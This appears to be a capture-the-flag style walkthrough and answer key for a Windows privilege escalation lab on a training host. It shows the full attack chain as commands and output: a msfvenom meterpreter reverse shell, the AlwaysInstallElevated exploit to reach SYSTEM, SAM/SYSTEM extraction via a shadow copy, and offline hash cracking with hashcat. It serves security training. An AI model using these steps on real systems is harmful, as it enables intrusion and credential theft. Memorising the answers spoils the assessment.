# Windows Privilege Escalation Skills Assessment - Part II
As an add-on to their annual penetration test, the INLANEFREIGHT organization has asked you to perform a security review of their standard Windows 10 gold image build currently in use by over 1,200 of their employees worldwide. The new CISO is worried that best practices were not followed when establishing the image baseline, and there may be one or more local privilege escalation vectors present in the build. Above all, the CISO wants to protect the company's internal infrastructure by ensuring that an attacker who can gain access to a workstation (through a phishing attack, for example) would be unable to escalate privileges and use that access move laterally through the network. Due to regulatory requirements, INLANEFREIGHT employees do not have local administrator privileges on their workstations.

You have been granted a standard user account with RDP access to a clone of a standard user Windows 10 workstation with no internet access. The client wants as comprehensive an assessment as possible (they will likely hire your firm to test/attempt to bypass EDR controls in the future); therefore, Defender has been disabled. Due to regulatory controls, they cannot allow internet access to the host, so you will need to transfer any tools over yourself.

Enumerate the host fully and attempt to escalate privileges to administrator/SYSTEM level access.

## Questions
RDP to 10.129.43.33 (ACADEMY-WINLPE-SKILLS2-WS), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Find left behind cleartext credentials for the iamtheadministrator domain admin account. **Answer: Inl@n3fr3ight_sup3rAdm1n!**
   - Look for unattended installation files:
          ```cmd
          C:\>dir /s /b unattend.xml
          C:\Windows\Panther\unattend.xml
          ```
   - Read the credential:
          ```cmd
          C:\> notepad C:\Windows\Panther\unattend.xml
          ```
2. Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop **Answer: el3vatEd_1nstall$_v3ry_r1sky**
   - Generate meterpreter shell payload and move it to the shared drive:
        ```shellsession
        $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.142 LPORT=4444 -f exe > Downloads/rev.exe
        [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
        [-] No arch selected, selecting arch: x64 from the payload
        No encoder specified, outputting raw payload
        Payload size: 510 bytes
        Final size of exe file: 7680 bytes
        ```
   - Start meterpreter listener and catch the shell when executing `rev.exe` on the RDP session:
        ```shellsession
        $ sudo msfconsole -q
        [msf](Jobs:0 Agents:0) >> use exploit/multi/handler 
        [*] Using configured payload generic/shell_reverse_tcp
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
        payload => windows/x64/meterpreter/reverse_tcp
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 10.10.15.142
        LPORT => 10.10.15.142
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.15.142
        LHOST => 10.10.15.142
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 4444
        LPORT => 4444
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> options

        Payload options (windows/x64/meterpreter/reverse_tcp):

        Name      Current Setting  Required  Description
        ----      ---------------  --------  -----------
        EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
                                                ead, process, none)
        LHOST     10.10.15.142     yes       The listen address (an interface may b
                                                e specified)
        LPORT     4444             yes       The listen port


        Exploit target:

        Id  Name
        --  ----
        0   Wildcard Target



        View the full module info with the info, or info -d command.

        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
        [*] Started reverse TCP handler on 10.10.15.142:4444 
        ^[[[*] Sending stage (232006 bytes) to 10.129.43.33
        [*] Meterpreter session 1 opened (10.10.15.142:4444 -> 10.129.43.33:49674) at 2026-07-19 00:02:58 -0400
        ```
   - Run the `post/multi/recon/local_exploit_suggester` to find LPE exploit, run that exploit to escalate to system admin and read the flag:
        ```shellsession
        [msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/recon/local_exploit_suggester
        [msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> options

        Module options (post/multi/recon/local_exploit_suggester):

        Name             Current Setting  Required  Description
        ----             ---------------  --------  -----------
        SESSION                           yes       The session to run this module
                                                    on
        SHOWDESCRIPTION  false            yes       Displays a detailed description
                                                        for the available exploits


        View the full module info with the info, or info -d command.

        [msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set SESSION 1
        SESSION => 1
        [msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run
        [*] 10.129.43.33 - Collecting local exploits for x64/windows...
        /usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
        /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
        [*] 10.129.43.33 - 239 exploit checks are being tried...
        [+] 10.129.43.33 - exploit/windows/local/always_install_elevated: The target is vulnerable.
        
        <SNIP>

        [msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/always_install_elevated
        [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
        [msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set LHOST 10.10.15.142
        LHOST => 10.10.15.142
        [msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set LPORT 8888
        LPORT => 8888
        [msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set SESSION 1
        SESSION => 1
        [msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> run
        [*] Started reverse TCP handler on 10.10.15.142:8888 
        [*] Uploading the MSI to C:\Users\HTB-ST~1\AppData\Local\Temp\pSADuuRFgdtJ.msi ...
        [*] Executing MSI...
        [*] Sending stage (190534 bytes) to 10.129.43.33
        [+] Deleted C:\Users\HTB-ST~1\AppData\Local\Temp\pSADuuRFgdtJ.msi
        [*] Meterpreter session 2 opened (10.10.15.142:8888 -> 10.129.43.33:49676) at 2026-07-19 00:12:40 -0400

        (Meterpreter 2)(C:\Windows\system32) > shell
        Process 4576 created.
        Channel 2 created.
        Microsoft Windows [Version 10.0.18363.592]
        (c) 2019 Microsoft Corporation. All rights reserved.

        C:\Windows\system32>whoami
        whoami
        nt authority\system

        C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt
        more C:\Users\Administrator\Desktop\flag.txt
        el3vatEd_1nstall$_v3ry_r1sky
        ```
3. There is 1 disabled local admin user on this system with a weak password that may be used to access other systems in the network and is worth reporting to the client. After escalating privileges retrieve the NTLM hash for this user and crack it offline. Submit the cleartext password for this account. **Answer: password1**
   - From the elevated session, assign `htb-student` into the `administrators` group:
     ```cmd
     C:\Windows> net localgroup administrators htb-student /add
     ```
   - On the RDP session, open powershell as administrator, enter `htb-student` credential to access the elevated shell, create a shadowcopy of `C:\` drive:
     ```cmd
     C:\Windows> wmic shadowcopy call create Volume='C:\'
     Executing (Win32_ShadowCopy)->create()
     Method execution successful.
     Out Parameters:
     instance of __PARAMETERS
     {
          ReturnValue = 0;
          ShadowID = "{436E71E7-AB8C-4AC2-89EB-BD9131219B73}";
     };
     C:\Windows> wmic shadowcopy where "ID='{436E71E7-AB8C-4AC2-89EB-BD9131219B73}'" get DeviceObject
     DeviceObject
     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
     ```
   - Copy the SAM and SYSTEM file to our shared drive and retrieve the NT hash:
     ```cmd
     PS C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM \\tsclient\share
          1 file(s) copied.

     PS C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM \\tsclient\share
          1 file(s) copied.
     ```
     ```shellsession
     $ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
     Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

     [*] Target system bootKey: 0xfab4b2e32a415ea36f846b9408aa69af
     [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
     mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
     htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
     wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
     [*] Cleaning up... 
     ```
   - Crack it offline:
     ```cmd
     $ hashcat -m 1000 5835048ce94ad0564e29a924a03510ef /usr/share/wordlists/rockyou.txt 
     hashcat (v6.2.6) starting

     <SNIP>

     5835048ce94ad0564e29a924a03510ef:password1

     <SNIP>
     ```